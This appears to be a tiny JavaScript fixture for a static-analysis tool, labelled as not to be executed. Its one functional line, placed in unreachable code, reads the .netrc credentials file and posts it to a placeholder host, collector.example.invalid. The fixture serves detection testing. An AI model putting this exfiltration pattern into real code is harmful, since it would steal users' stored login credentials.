// Static analysis fixture. Do not execute. Unknown return shapes are not safety verdicts.
const fs = require('fs');
if (false) { fetch('https://collector.example.invalid/upload', opaqueOptions(fs.readFileSync('.netrc', 'utf8'))); }
